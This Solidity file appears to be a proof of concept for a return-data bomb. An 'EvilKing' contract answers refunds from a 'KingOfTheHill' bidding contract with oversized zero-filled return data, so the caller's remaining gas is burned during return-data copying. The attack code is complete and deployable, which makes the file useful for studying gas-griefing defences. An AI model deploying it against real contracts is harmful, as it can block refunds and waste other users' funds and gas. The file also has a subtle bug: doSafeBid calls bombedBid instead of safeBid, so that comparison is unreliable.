// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

interface IKing {
    function receiveKingPayment() external payable; 
    function receiveKingPaymentWithReturn() external payable;
}

contract KingOfTheHill {
    address public king;
    uint256 public topBid;

    function bombedBid() external payable {
        require(msg.value > topBid);
        address unseatedKing = king;
        uint256 unseatedBid = topBid;
        king = msg.sender;
        topBid = msg.value;
        // Return the previous king's bid amount.
        // Common to assume that 1/64 of gasleft() before the
        // call will be available to complete execution.
        address(unseatedKing).call{value: unseatedBid}("");
    }
    
    // Added this to compare against regular contract.method() calls with return.
    function methodBidWithReturn() external payable {
        require(msg.value > topBid);
        address unseatedKing = king;
        uint256 unseatedBid = topBid;
        king = msg.sender;
        topBid = msg.value;

        IKing(unseatedKing).receiveKingPaymentWithReturn{value: unseatedBid}();
    }

    // Added this to compare against regular contract.method() calls.
    function safeBid() external payable {
        require(msg.value > topBid);
        address unseatedKing = king;
        uint256 unseatedBid = topBid;
        king = msg.sender;
        topBid = msg.value;

        IKing(unseatedKing).receiveKingPayment{value: unseatedBid}();
    }
}

contract EvilKing {
    KingOfTheHill private hill;
    constructor(KingOfTheHill _hill) { 
        hill = _hill;
    }

    function doSafeBid() external payable {
        hill.bombedBid{value: msg.value}();
    }

    function doMethodBidWithReturn() external payable {
        hill.methodBidWithReturn{value: msg.value}();
    }
    
    function doBombedBid() external payable {
        hill.bombedBid{value: msg.value}();
    }

    // Force calling contract to consume remaining gas in RETURNDATACOPY
    // by returning as much 0 data as possible without running out of gas.

    // The bombedBid ends up here.
    fallback() external payable {
        // approximate solution to Cmem for new_mem_size_words
        uint256 rsize = sqrt(gasleft() / 2 * 512);
        assembly {
            return(0x0, mul(rsize, 0x20))
        }
    }

    // The safeBid ends up here.
    function receiveKingPayment() external payable{
        require(msg.sender == address(hill), "Only Hill callback");
    }

    function receiveKingPaymentWithReturn() external payable {
        require(msg.sender == address(hill), "Only Hill callback");

        // approximate solution to Cmem for new_mem_size_words
        uint256 rsize = sqrt(gasleft() / 2 * 512);
        assembly {
            return(0x0, mul(rsize, 0x20))
        }
    }

    function sqrt(uint x) private returns (uint y) {
        uint z = (x + 1) / 2;
        y = x;
        while (z < y) {
            y = z;
            z = (x / z + z) / 2;
        }
    }
}